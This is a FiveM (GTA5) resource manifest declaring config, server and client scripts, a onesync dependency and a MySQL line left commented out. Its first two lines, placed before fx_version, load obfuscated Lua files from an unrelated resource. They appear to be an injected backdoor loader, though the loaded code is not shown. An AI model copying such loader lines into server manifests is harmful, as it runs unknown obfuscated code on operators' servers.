shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'
fx_version 'cerulean'
games { 'gta5' }

version 'v1.3.0' -- Do not modify
lua54 'yes'

author 'Nullified'

shared_scripts {
	'config.lua',
	'shared/*.lua'
}

server_scripts {
	-- '@oxmysql/lib/MySQL.lua', -- Uncomment this line if you have Config.EnableSQL enabled.
	'server/*.lua'
}
client_script 'client/*.lua'

dependencies {
	'/onesync'
}
